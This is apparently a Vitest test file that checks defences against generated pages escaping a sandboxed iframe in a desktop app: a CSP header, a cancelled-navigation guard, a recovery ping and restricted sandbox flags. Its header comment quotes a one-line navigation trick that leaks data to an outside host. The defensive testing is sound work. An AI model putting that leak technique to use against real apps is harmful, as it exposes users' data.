import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { frameVerdict } from "../src/renderer/frameRecovery";

/**
 * 2026-11-17 review: a generated page's only policy was the frame page's <meta> CSP,
 * and CSP does not govern navigation: the sandboxed frame could still navigate itself
 * to any address (`location = "https://elsewhere/?" + data`), landing on a document
 * with no policy at all. The host now sends the same policy as a response header and
 * cancels every frame navigation that leaves the frame page (artifact_frame.rs; its
 * Rust tests pin the allowed list). The live WebView2 behaviour was checked on the
 * installed app (see the 0.0.2 release notes), not here.
 */

const lib = readFileSync("src-tauri/src/lib.rs", "utf8");
const guard = readFileSync("src-tauri/src/artifact_frame.rs", "utf8");
const frame = readFileSync("src/renderer/public/artifact-frame.html", "utf8");
const view = readFileSync("src/renderer/ArtifactView.tsx", "utf8");

describe("the generated-page frame cannot reach out", () => {
  it("serves the frame page with its policy as a response header", () => {
    expect(lib).toMatch(/\.header\("Content-Security-Policy", csp\)/);
    expect(lib).toMatch(/artifact_frame::frame_csp\(ARTIFACT_FRAME_HTML\)/);
  });

  it("installs the frame navigation guard before the window is shown", () => {
    const install = lib.indexOf("artifact_frame::install_navigation_guard(&window)");
    const show = lib.indexOf("window.show()?", install);
    expect(install).toBeGreaterThan(0);
    expect(show).toBeGreaterThan(install);
    expect(guard).toMatch(/add_FrameNavigationStarting/);
    expect(guard).toMatch(/SetCancel\(true\)/);
  });

  // Installed-build check, 2026-11-17: the host cancelled the navigation and nothing left, but a
  // cancelled frame navigation leaves the browser's error page in place of the generated page. The
  // Navigation API cannot cancel it inside the frame (its events are off in a sandboxed, opaque-origin
  // document: measured in Edge). The window pings the frame after a later load; only the frame page
  // holding the page answers with its key, and the page is shown again once, then stopped with a notice.
  it("the frame page answers a ping with its key, before and after writing the page", () => {
    expect(frame).toMatch(/function onPing\(e\) \{ if \(e\.source === parent && e\.data && e\.data\.npuPing\) parent\.postMessage\(\{ npuPong: true, key: key \}/);
    expect((frame.match(/window\.addEventListener\("message", onPing\)/g) ?? []).length).toBe(2);
  });

  it("the window pings after a later load and shows the page again or stops", () => {
    expect(view).toMatch(/postMessage\(\{ npuPing: true \}, "\*"\)/);
    expect(view).toMatch(/frameVerdict\(slot\.key, answered, shownAgain\.current\.has\(slot\.key\)\)/);
    expect(view).toMatch(/fr\.src = FRAME_SRC;/);
  });

  it("frameVerdict keeps an answering frame, shows a lost page again once, then stops", () => {
    expect(frameVerdict(3, 3, false)).toBe("kept");
    expect(frameVerdict(3, null, false)).toBe("show-again"); // the error page, or a reloaded empty frame page
    expect(frameVerdict(3, 2, false)).toBe("show-again");
    expect(frameVerdict(3, null, true)).toBe("stop");
  });

  it("the frame page blocks every request and the frame stays sandboxed to scripts only", () => {
    expect(frame).toMatch(/content="default-src 'none'; script-src 'unsafe-inline'/);
    expect(frame).not.toMatch(/connect-src|form-action \*/);
    expect(view).toMatch(/sandbox="allow-scripts"/);
    expect(view).not.toMatch(/allow-same-origin|allow-top-navigation|allow-popups|allow-forms/);
  });
});
